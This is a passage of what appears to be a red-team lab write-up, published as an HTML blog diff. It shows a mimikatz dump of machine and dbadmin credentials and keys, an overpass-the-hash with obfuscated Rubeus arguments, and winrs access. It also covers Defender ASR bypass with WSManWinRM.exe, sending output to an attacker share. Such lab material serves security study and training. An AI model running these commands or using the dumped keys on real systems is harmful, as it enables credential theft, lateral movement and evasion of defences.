+<span class="s1">SID               : S-1-5-96-0-7</span>
+
+<span class="s1">         * Username : EU-SQL30$</span>
+<span class="s1">         * Domain   : eu.eurocorp.local</span>
+<span class="s1">         * Password : F=!vGF(]A4Z_-;Bb^v&gt;j*WUfYrEx=YePp6CT3&#39;</span><span class="n">9j</span><span class="p">+</span><span class="n">woO</span><span class="p">)</span><span class="n">VF784p</span><span class="p">[</span><span class="n">ai</span><span class="p">\</span><span class="k">%</span><span class="n">wH</span><span class="p">!</span><span class="n">p2</span><span class="p">.[</span><span class="n">rLV</span><span class="p">+</span><span class="n">YNY</span><span class="p">,:*</span><span class="n">7</span><span class="p">.</span><span class="n">MCuFIh1WV</span><span class="p">;</span><span class="n">u</span><span class="p">:/^;\</span><span class="n">2nHV</span><span class="p">+</span><span class="c">#v.lw.V+/[WHYY*HWL+O/hgV</span>
+         <span class="p">*</span> <span class="n">Key</span> <span class="n">List</span> <span class="p">:</span>
+           <span class="n">aes256_hmac</span>       <span class="n">500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+           <span class="n">aes128_hmac</span>       <span class="n">cacc31c9e0264f6a09a4211e1e1c283d</span>
+           <span class="n">rc4_hmac_nt</span>       <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old</span>      <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_md4</span>           <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_nt_exp</span>   <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old_exp</span>  <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="n">Authentication</span> <span class="n">Id</span> <span class="p">:</span> <span class="n">0</span> <span class="p">;</span> <span class="n">3464718</span> <span class="p">(</span><span class="n">00000000</span><span class="p">:</span><span class="n">0034de0e</span><span class="p">)</span>
+<span class="n">Session</span>           <span class="p">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="n">6</span>
+<span class="n">User</span> <span class="n">Name</span>         <span class="p">:</span> <span class="n">UMFD</span><span class="p">-</span><span class="n">6</span>
+<span class="n">Domain</span>            <span class="p">:</span> <span class="n">Font</span> <span class="n">Driver</span> <span class="n">Host</span>
+<span class="n">Logon</span> <span class="n">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+<span class="n">Logon</span> <span class="n">Time</span>        <span class="p">:</span> <span class="n">6</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span> <span class="n">7</span><span class="p">:</span><span class="n">44</span><span class="p">:</span><span class="n">43</span> <span class="n">AM</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">96</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">6</span>
+
+         <span class="p">*</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">EU-SQL30</span><span class="p">$</span>
+         <span class="p">*</span> <span class="n">Domain</span>   <span class="p">:</span> <span class="n">eu</span><span class="p">.</span><span class="n">eurocorp</span><span class="p">.</span><span class="n">local</span>
+         <span class="p">*</span> <span class="n">Password</span> <span class="p">:</span> <span class="n">F</span><span class="p">=!</span><span class="n">vGF</span><span class="p">(]</span><span class="n">A4Z_</span><span class="p">-;</span><span class="n">Bb</span><span class="p">^</span><span class="n">v</span><span class="p">&gt;</span><span class="n">j</span><span class="p">*</span><span class="n">WUfYrEx</span><span class="p">=</span><span class="n">YePp6CT3</span><span class="s1">&#39;9j+woO)VF784p[ai\%wH!p2.[rLV+YNY,:*7.MCuFIh1WV;u:/^;\2nHV+#v.lw.V+/[WHYY*HWL+O/hgV</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+<span class="s1">           aes128_hmac       cacc31c9e0264f6a09a4211e1e1c283d</span>
+<span class="s1">           rc4_hmac_nt       e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old      e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_md4           e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_nt_exp   e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old_exp  e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="s1">Authentication Id : 0 ; 2975652 (00000000:002d67a4)</span>
+<span class="s1">Session           : Interactive from 5</span>
+<span class="s1">User Name         : UMFD-5</span>
+<span class="s1">Domain            : Font Driver Host</span>
+<span class="s1">Logon Server      : (null)</span>
+<span class="s1">Logon Time        : 6/18/2024 7:43:56 AM</span>
+<span class="s1">SID               : S-1-5-96-0-5</span>
+
+<span class="s1">         * Username : EU-SQL30$</span>
+<span class="s1">         * Domain   : eu.eurocorp.local</span>
+<span class="s1">         * Password : F=!vGF(]A4Z_-;Bb^v&gt;j*WUfYrEx=YePp6CT3&#39;</span><span class="n">9j</span><span class="p">+</span><span class="n">woO</span><span class="p">)</span><span class="n">VF784p</span><span class="p">[</span><span class="n">ai</span><span class="p">\</span><span class="k">%</span><span class="n">wH</span><span class="p">!</span><span class="n">p2</span><span class="p">.[</span><span class="n">rLV</span><span class="p">+</span><span class="n">YNY</span><span class="p">,:*</span><span class="n">7</span><span class="p">.</span><span class="n">MCuFIh1WV</span><span class="p">;</span><span class="n">u</span><span class="p">:/^;\</span><span class="n">2nHV</span><span class="p">+</span><span class="c">#v.lw.V+/[WHYY*HWL+O/hgV</span>
+         <span class="p">*</span> <span class="n">Key</span> <span class="n">List</span> <span class="p">:</span>
+           <span class="n">aes256_hmac</span>       <span class="n">500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+           <span class="n">aes128_hmac</span>       <span class="n">cacc31c9e0264f6a09a4211e1e1c283d</span>
+           <span class="n">rc4_hmac_nt</span>       <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old</span>      <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_md4</span>           <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_nt_exp</span>   <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old_exp</span>  <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="n">Authentication</span> <span class="n">Id</span> <span class="p">:</span> <span class="n">0</span> <span class="p">;</span> <span class="n">1791252</span> <span class="p">(</span><span class="n">00000000</span><span class="p">:</span><span class="n">001b5514</span><span class="p">)</span>
+<span class="n">Session</span>           <span class="p">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="n">3</span>
+<span class="n">User</span> <span class="n">Name</span>         <span class="p">:</span> <span class="n">UMFD</span><span class="p">-</span><span class="n">3</span>
+<span class="n">Domain</span>            <span class="p">:</span> <span class="n">Font</span> <span class="n">Driver</span> <span class="n">Host</span>
+<span class="n">Logon</span> <span class="n">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+<span class="n">Logon</span> <span class="n">Time</span>        <span class="p">:</span> <span class="n">6</span><span class="p">/</span><span class="n">18</span><span class="p">/</span><span class="n">2024</span> <span class="n">7</span><span class="p">:</span><span class="n">42</span><span class="p">:</span><span class="n">07</span> <span class="n">AM</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">96</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">3</span>
+
+         <span class="p">*</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">EU-SQL30</span><span class="p">$</span>
+         <span class="p">*</span> <span class="n">Domain</span>   <span class="p">:</span> <span class="n">eu</span><span class="p">.</span><span class="n">eurocorp</span><span class="p">.</span><span class="n">local</span>
+         <span class="p">*</span> <span class="n">Password</span> <span class="p">:</span> <span class="n">F</span><span class="p">=!</span><span class="n">vGF</span><span class="p">(]</span><span class="n">A4Z_</span><span class="p">-;</span><span class="n">Bb</span><span class="p">^</span><span class="n">v</span><span class="p">&gt;</span><span class="n">j</span><span class="p">*</span><span class="n">WUfYrEx</span><span class="p">=</span><span class="n">YePp6CT3</span><span class="s1">&#39;9j+woO)VF784p[ai\%wH!p2.[rLV+YNY,:*7.MCuFIh1WV;u:/^;\2nHV+#v.lw.V+/[WHYY*HWL+O/hgV</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+<span class="s1">           aes128_hmac       cacc31c9e0264f6a09a4211e1e1c283d</span>
+<span class="s1">           rc4_hmac_nt       e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old      e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_md4           e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_nt_exp   e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old_exp  e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="s1">Authentication Id : 0 ; 1345732 (00000000:001488c4)</span>
+<span class="s1">Session           : RemoteInteractive from 2</span>
+<span class="s1">User Name         : dbadmin</span>
+<span class="s1">Domain            : EU</span>
+<span class="s1">Logon Server      : EU-DC</span>
+<span class="s1">Logon Time        : 2/21/2024 6:56:02 AM</span>
+<span class="s1">SID               : S-1-5-21-3665721161-1121904292-1901483061-1105</span>
+
+<span class="s1">         * Username : dbadmin</span>
+<span class="s1">         * Domain   : EU.EUROCORP.LOCAL</span>
+<span class="s1">         * Password : (null)</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f</span>
+<span class="s1">           rc4_hmac_nt       0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_old      0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_md4           0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_nt_exp   0553b02b95f64f7a3c27b9029d105c27</span>
+<span class="s1">           rc4_hmac_old_exp  0553b02b95f64f7a3c27b9029d105c27</span>
+
+<span class="s1">Authentication Id : 0 ; 1283434 (00000000:0013956a)</span>
+<span class="s1">Session           : Interactive from 2</span>
+<span class="s1">User Name         : UMFD-2</span>
+<span class="s1">Domain            : Font Driver Host</span>
+<span class="s1">Logon Server      : (null)</span>
+<span class="s1">Logon Time        : 2/21/2024 6:53:57 AM</span>
+<span class="s1">SID               : S-1-5-96-0-2</span>
+
+<span class="s1">         * Username : EU-SQL30$</span>
+<span class="s1">         * Domain   : eu.eurocorp.local</span>
+<span class="s1">         * Password : F=!vGF(]A4Z_-;Bb^v&gt;j*WUfYrEx=YePp6CT3&#39;</span><span class="n">9j</span><span class="p">+</span><span class="n">woO</span><span class="p">)</span><span class="n">VF784p</span><span class="p">[</span><span class="n">ai</span><span class="p">\</span><span class="k">%</span><span class="n">wH</span><span class="p">!</span><span class="n">p2</span><span class="p">.[</span><span class="n">rLV</span><span class="p">+</span><span class="n">YNY</span><span class="p">,:*</span><span class="n">7</span><span class="p">.</span><span class="n">MCuFIh1WV</span><span class="p">;</span><span class="n">u</span><span class="p">:/^;\</span><span class="n">2nHV</span><span class="p">+</span><span class="c">#v.lw.V+/[WHYY*HWL+O/hgV</span>
+         <span class="p">*</span> <span class="n">Key</span> <span class="n">List</span> <span class="p">:</span>
+           <span class="n">aes256_hmac</span>       <span class="n">500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+           <span class="n">aes128_hmac</span>       <span class="n">cacc31c9e0264f6a09a4211e1e1c283d</span>
+           <span class="n">rc4_hmac_nt</span>       <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old</span>      <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_md4</span>           <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_nt_exp</span>   <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old_exp</span>  <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="n">Authentication</span> <span class="n">Id</span> <span class="p">:</span> <span class="n">0</span> <span class="p">;</span> <span class="n">56392</span> <span class="p">(</span><span class="n">00000000</span><span class="p">:</span><span class="n">0000dc48</span><span class="p">)</span>
+<span class="n">Session</span>           <span class="p">:</span> <span class="n">Service</span> <span class="n">from</span> <span class="n">0</span>
+<span class="n">User</span> <span class="n">Name</span>         <span class="p">:</span> <span class="n">SQLTELEMETRY</span>
+<span class="n">Domain</span>            <span class="p">:</span> <span class="n">NT</span> <span class="n">Service</span>
+<span class="n">Logon</span> <span class="n">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+<span class="n">Logon</span> <span class="n">Time</span>        <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">21</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">33</span><span class="p">:</span><span class="n">58</span> <span class="n">AM</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">80</span><span class="p">-</span><span class="n">2652535364</span><span class="p">-</span><span class="n">2169709536</span><span class="p">-</span><span class="n">2857650723</span><span class="p">-</span><span class="n">2622804123</span><span class="p">-</span><span class="n">1107741775</span>
+
+         <span class="p">*</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">EU-SQL30</span><span class="p">$</span>
+         <span class="p">*</span> <span class="n">Domain</span>   <span class="p">:</span> <span class="n">eu</span><span class="p">.</span><span class="n">eurocorp</span><span class="p">.</span><span class="n">local</span>
+         <span class="p">*</span> <span class="n">Password</span> <span class="p">:</span> <span class="n">F</span><span class="p">=!</span><span class="n">vGF</span><span class="p">(]</span><span class="n">A4Z_</span><span class="p">-;</span><span class="n">Bb</span><span class="p">^</span><span class="n">v</span><span class="p">&gt;</span><span class="n">j</span><span class="p">*</span><span class="n">WUfYrEx</span><span class="p">=</span><span class="n">YePp6CT3</span><span class="s1">&#39;9j+woO)VF784p[ai\%wH!p2.[rLV+YNY,:*7.MCuFIh1WV;u:/^;\2nHV+#v.lw.V+/[WHYY*HWL+O/hgV</span>
+<span class="s1">         * Key List :</span>
+<span class="s1">           aes256_hmac       500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+<span class="s1">           aes128_hmac       cacc31c9e0264f6a09a4211e1e1c283d</span>
+<span class="s1">           rc4_hmac_nt       e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old      e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_md4           e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_nt_exp   e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+<span class="s1">           rc4_hmac_old_exp  e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="s1">Authentication Id : 0 ; 20981 (00000000:000051f5)</span>
+<span class="s1">Session           : Interactive from 0</span>
+<span class="s1">User Name         : UMFD-0</span>
+<span class="s1">Domain            : Font Driver Host</span>
+<span class="s1">Logon Server      : (null)</span>
+<span class="s1">Logon Time        : 2/21/2024 6:33:57 AM</span>
+<span class="s1">SID               : S-1-5-96-0-0</span>
+
+<span class="s1">         * Username : EU-SQL30$</span>
+<span class="s1">         * Domain   : eu.eurocorp.local</span>
+<span class="s1">         * Password : F=!vGF(]A4Z_-;Bb^v&gt;j*WUfYrEx=YePp6CT3&#39;</span><span class="n">9j</span><span class="p">+</span><span class="n">woO</span><span class="p">)</span><span class="n">VF784p</span><span class="p">[</span><span class="n">ai</span><span class="p">\</span><span class="k">%</span><span class="n">wH</span><span class="p">!</span><span class="n">p2</span><span class="p">.[</span><span class="n">rLV</span><span class="p">+</span><span class="n">YNY</span><span class="p">,:*</span><span class="n">7</span><span class="p">.</span><span class="n">MCuFIh1WV</span><span class="p">;</span><span class="n">u</span><span class="p">:/^;\</span><span class="n">2nHV</span><span class="p">+</span><span class="c">#v.lw.V+/[WHYY*HWL+O/hgV</span>
+         <span class="p">*</span> <span class="n">Key</span> <span class="n">List</span> <span class="p">:</span>
+           <span class="n">aes256_hmac</span>       <span class="n">500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+           <span class="n">aes128_hmac</span>       <span class="n">cacc31c9e0264f6a09a4211e1e1c283d</span>
+           <span class="n">rc4_hmac_nt</span>       <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old</span>      <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_md4</span>           <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_nt_exp</span>   <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old_exp</span>  <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="n">Authentication</span> <span class="n">Id</span> <span class="p">:</span> <span class="n">0</span> <span class="p">;</span> <span class="n">20943</span> <span class="p">(</span><span class="n">00000000</span><span class="p">:</span><span class="n">000051cf</span><span class="p">)</span>
+<span class="n">Session</span>           <span class="p">:</span> <span class="n">Interactive</span> <span class="n">from</span> <span class="n">1</span>
+<span class="n">User</span> <span class="n">Name</span>         <span class="p">:</span> <span class="n">UMFD</span><span class="p">-</span><span class="n">1</span>
+<span class="n">Domain</span>            <span class="p">:</span> <span class="n">Font</span> <span class="n">Driver</span> <span class="n">Host</span>
+<span class="n">Logon</span> <span class="n">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+<span class="n">Logon</span> <span class="n">Time</span>        <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">21</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">33</span><span class="p">:</span><span class="n">57</span> <span class="n">AM</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">96</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">1</span>
+
+         <span class="p">*</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">EU-SQL30</span><span class="p">$</span>
+         <span class="p">*</span> <span class="n">Domain</span>   <span class="p">:</span> <span class="n">eu</span><span class="p">.</span><span class="n">eurocorp</span><span class="p">.</span><span class="n">local</span>
+         <span class="p">*</span> <span class="n">Password</span> <span class="p">:</span> <span class="n">F</span><span class="p">=!</span><span class="n">vGF</span><span class="p">(]</span><span class="n">A4Z_</span><span class="p">-;</span><span class="n">Bb</span><span class="p">^</span><span class="n">v</span><span class="p">&gt;</span><span class="n">j</span><span class="p">*</span><span class="n">WUfYrEx</span><span class="p">=</span><span class="n">YePp6CT3</span><span class="err">&#39;</span><span class="n">9j</span><span class="p">+</span><span class="n">woO</span><span class="p">)</span><span class="n">VF784p</span><span class="p">[</span><span class="n">ai</span><span class="p">\</span><span class="k">%</span><span class="n">wH</span><span class="p">!</span><span class="n">p2</span><span class="p">.[</span><span class="n">rLV</span><span class="p">+</span><span class="n">YNY</span><span class="p">,:*</span><span class="n">7</span><span class="p">.</span><span class="n">MCuFIh1WV</span><span class="p">;</span><span class="n">u</span><span class="p">:/^;\</span><span class="n">2nHV</span><span class="p">+</span><span class="c">#v.lw.V+/[WHYY*HWL+O/hgV</span>
+         <span class="p">*</span> <span class="n">Key</span> <span class="n">List</span> <span class="p">:</span>
+           <span class="n">aes256_hmac</span>       <span class="n">500318a0c9572ef2fc8d04c4dc5944a0c9973a81d5c2b687447bb0f9fb5cb39f</span>
+           <span class="n">aes128_hmac</span>       <span class="n">cacc31c9e0264f6a09a4211e1e1c283d</span>
+           <span class="n">rc4_hmac_nt</span>       <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old</span>      <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_md4</span>           <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_nt_exp</span>   <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old_exp</span>  <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="n">Authentication</span> <span class="n">Id</span> <span class="p">:</span> <span class="n">0</span> <span class="p">;</span> <span class="n">999</span> <span class="p">(</span><span class="n">00000000</span><span class="p">:</span><span class="n">000003e7</span><span class="p">)</span>
+<span class="n">Session</span>           <span class="p">:</span> <span class="n">UndefinedLogonType</span> <span class="n">from</span> <span class="n">0</span>
+<span class="n">User</span> <span class="n">Name</span>         <span class="p">:</span> <span class="n">EU-SQL30</span><span class="p">$</span>
+<span class="n">Domain</span>            <span class="p">:</span> <span class="n">EU</span>
+<span class="n">Logon</span> <span class="n">Server</span>      <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+<span class="n">Logon</span> <span class="n">Time</span>        <span class="p">:</span> <span class="n">2</span><span class="p">/</span><span class="n">21</span><span class="p">/</span><span class="n">2024</span> <span class="n">6</span><span class="p">:</span><span class="n">33</span><span class="p">:</span><span class="n">56</span> <span class="n">AM</span>
+<span class="n">SID</span>               <span class="p">:</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">18</span>
+
+         <span class="p">*</span> <span class="n">Username</span> <span class="p">:</span> <span class="n">eu-sql30</span><span class="p">$</span>
+         <span class="p">*</span> <span class="n">Domain</span>   <span class="p">:</span> <span class="n">EU</span><span class="p">.</span><span class="n">EUROCORP</span><span class="p">.</span><span class="n">LOCAL</span>
+         <span class="p">*</span> <span class="n">Password</span> <span class="p">:</span> <span class="p">(</span><span class="n">null</span><span class="p">)</span>
+         <span class="p">*</span> <span class="n">Key</span> <span class="n">List</span> <span class="p">:</span>
+           <span class="n">aes256_hmac</span>       <span class="n">d35bc0e8887fa1466f369b7555faf458ef366252520ac1abbac473a1d1f376d8</span>
+           <span class="n">rc4_hmac_nt</span>       <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old</span>      <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_md4</span>           <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_nt_exp</span>   <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+           <span class="n">rc4_hmac_old_exp</span>  <span class="n">e175d66c37d8c6a3ccb5d0e4607f3d8d</span>
+
+<span class="n">mimikatz</span><span class="p">(</span><span class="n">commandline</span><span class="p">)</span> <span class="c"># exit</span>
+<span class="n">Bye</span><span class="p">!</span>
+</code></pre></div>
+
+<p>Amazing, we were able to dump the credentials used in EU-SQL30. Now we can do an OPTH to get a new session as dbadmin for EUROCORP.LOCAL domain and access the EU-SQL30 remotely.</p>
+<h3>Using PELoader.exe for args encoding.</h3>
+<p>Back to cmdlet, <code>PELoader.exe</code> is a tool used to load a payload into memory. So I’ll use PELoader.exe now to load and execute Rubeus.exe into memory. Pay attention that if we are using PELoader.exe to load payloads into memory only. It is also good that we execute <strong>ArgSplit.bat</strong> first to encode parameters of Rubeus, SafetyKatz and BetterSafetyKatz.</p>
+<p>ArgSplit.bat</p>
+<p><code>asktgt</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">asktgt</span>
+<span class="nb">set </span><span class="s2">&quot;z=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=g&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=t&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=k&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=s&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=a&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now, let’s use Overpass-the-hash our macine using Rubeus to start a new process with privileges of the <code>dbadmin</code> user who is a member of eu.eurocorp.local. 
+Run the below command from a high integrity process on our attacking machine(Run as administrator).
+I’ll be using AES256 key for this OPTH because it’s more stealthy.</p>
+<p><code>Username:dbadmin</code></p>
+<p><code>aes256_hmac:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f</code></p>
+<h3>Using Rubeus for  OPTH</h3>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt</code></p>
+<p>Now we can connect to EU-SQL30.</p>
+<p><code>winrs -r:eu-sql30.eu.eurocorp.local cmd</code></p>
+<h1>Lateral Movement – ASR Rules Bypass</h1>
+<p><strong>Attack Surface Reduction (ASR)</strong></p>
+<p>Attack Surface Reduction (ASR) is a set of security controls in Windows Defender that restrict common malware and exploit techniques. 
+ASR aims to minimize the attack surface by eliminating unnecessary functions, strengthening the overall hardening of services and features, tightening access controls, and updating software regularly.</p>
+<h3>ASR Rules</h3>
+<p>ASR rules are part of the ASR controls in Defender. These rules are designed to block common activities associated with malicious activity, such as:</p>
+<ul>
+<li>
+<p>Blocking Office applications from creating child processes</p>
+</li>
+<li>
+<p>Blocking Office applications from injecting code into other processes</p>
+</li>
+<li>
+<p>Blocking JavaScript or VBScript from launching downloaded executable content</p>
+</li>
+<li>
+<p>Blocking credential stealing from the Windows local security authority subsystem (lsass.exe)</p>
+</li>
+<li>
+<p>And many more.</p>
+</li>
+</ul>
+<h3>ASR States</h3>
+<p>ASR rules can be configured in three states:</p>
+<ul>
+<li>
+<p>Not Configured: No action is taken.</p>
+</li>
+<li>
+<p>Block: The rule blocks the specified activity.</p>
+</li>
+<li>
+<p>Audit: The rule generates events for insights but does not block the activity.</p>
+</li>
+</ul>
+<h3>ASR Requirements</h3>
+<p>To enable ASR rules, the following requirements must be met:</p>
+<ul>
+<li>
+<p>Windows 10 Pro, Enterprise, Education version 1709, and later</p>
+</li>
+<li>
+<p>Windows Server 2012R2/2016 supported using MDE unified agent</p>
+</li>
+<li>
+<p>Defender antivirus running in active mode</p>
+</li>
+<li>
+<p>Cloud-delivered protection recommended.</p>
+</li>
+</ul>
+<h3>ASR Bypass</h3>
+<p>Bypassing ASR rules can be achieved through various methods, including:</p>
+<ul>
+<li>
+<p>Code Execution: Using code that can bypass ASR rules by downloading and saving files with different extensions or using command-line tools to move files to their real paths.</p>
+</li>
+<li>
+<p>DLL Loading: Loading DLLs in a specific folder and calling Win32 API functions to bypass ASR rules.</p>
+</li>
+</ul>
+<p>The use of <code>winrs</code> is not detected by MDE but MDI(Microsoft Defender for Identity) detects it.</p>
+<p>To avoid detection, we can use the <code>WSManWinRM.exe</code> tool. We will append an ASR exclusion such as “<code>C:\Windows\ccmcache\</code>” to avoid detection from the "Block process creations originating from PSExec and WMI commands" ASR rule. Run the below command from the process spawned as dbadmin</p>
+<p><code>C:\AD\Tools\WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c set username C:\Windows\ccmcache\"</code></p>
+<p>To see the command output, we can redirect the command to our share file in out attacking machine. 
+This has very limited success and we are continuously trying ways to make it more effective.</p>
+<p><code>C:\AD\Tools\WSManWinRM.exe EU-SQL30.eu.eurocorp.local "cmd /c dir &gt;&gt; \\DCORP-STD451.dollarcorp.moneycorp.local\MyShares\out.txt C:\Windows\ccmcache\"</code></p>
+<p>If you face the issue  on the screenshot below, you can install VC_redist.x64.exe and run WSManWinRM.exe.
+The link for download is the one below screenshot.</p>
+<p><a href="https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170">https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170</a></p>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
